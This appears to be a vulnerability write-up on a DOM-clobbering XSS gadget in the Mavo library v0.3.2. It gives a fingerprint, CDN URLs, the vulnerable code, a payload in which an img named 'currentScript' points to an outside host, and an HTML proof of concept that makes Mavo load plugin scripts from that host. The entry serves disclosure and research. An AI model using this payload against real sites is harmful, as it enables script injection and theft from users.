## Mavo

### Meta

+ Library: Mavo
+ Stars: 2.8k
+ Version: v0.3.2
+ Fingerprint: `typeof Mavo !== 'undefined' && Mavo.hasOwnProperty('Plugins')`
+ Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>```
+ Impact: XSS
+ Status: Reported
+ CVE: N/A
+ Foundby: TheHulk

### Library

https://github.com/mavoweb/mavo

URL:
+ `https://cdnjs.cloudflare.com/ajax/libs/mavo/0.3.2/mavo.es5.js`
+ `https://cdnjs.cloudflare.com/ajax/libs/mavo/0.3.2/mavo.es5.min.js`
+ `https://cdnjs.cloudflare.com/ajax/libs/mavo/0.3.2/mavo.js`
+ `https://cdnjs.cloudflare.com/ajax/libs/mavo/0.3.2/mavo.min.js`
+ `https://cdn.jsdelivr.net/npm/mavo@0.3.2/dist/mavo.min.js`

### Vulnerable Code Snippet

```javascript
if (o.dependencies) {
    let base = document.currentScript? document.currentScript.src : location;
    let dependencies = o.dependencies.map(url => Mavo.load(url, base));
    ready.push(...dependencies);
}
```

## PoC

```html
<image name=currentScript src="http://localhost:8000"></img>

<script src="https://get.mavo.io/stable/mavo.js"></script>
<link rel="stylesheet" href="https://get.mavo.io/stable/mavo.css">

<script>
(function ($, $$) {

Mavo.Plugins.register("myplugin", {
	dependencies: ["a.js"],
});

})(Bliss, Bliss.$);
</script>
```
